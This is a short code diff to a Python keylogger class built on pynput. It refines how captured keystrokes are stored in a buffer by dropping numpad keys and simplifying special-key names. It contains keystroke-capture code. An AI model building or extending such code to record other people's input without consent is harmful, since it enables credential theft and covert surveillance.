@@ -1,6 +1,5 @@
-import time
 from pynput.keyboard import Listener
-import threading
+import threading, time
 
 input_buffer = ''  # a buffer to store inserted keys ( Resets each 5 sec )
 
@@ -31,8 +30,10 @@ class Keylogger:
         if str(key)[
             0] is '\'':  # if a normal key is pressed like 's' ---> we save s instead of 's' (removing first and last letter)
             self.input_buffer += str(key)[1:-1]
+        elif str(key)[0] is '<':  # we don't need numbers on right of keyboard
+            pass
         else:
-            self.input_buffer += str(key)
+            self.input_buffer += str(key).replace('_', '.').split(".")[1]  # example: Key.ctrl_l --> ctrl
         self.subject.set_buffer(self.input_buffer)
 
     # our main function that starts when we run our code
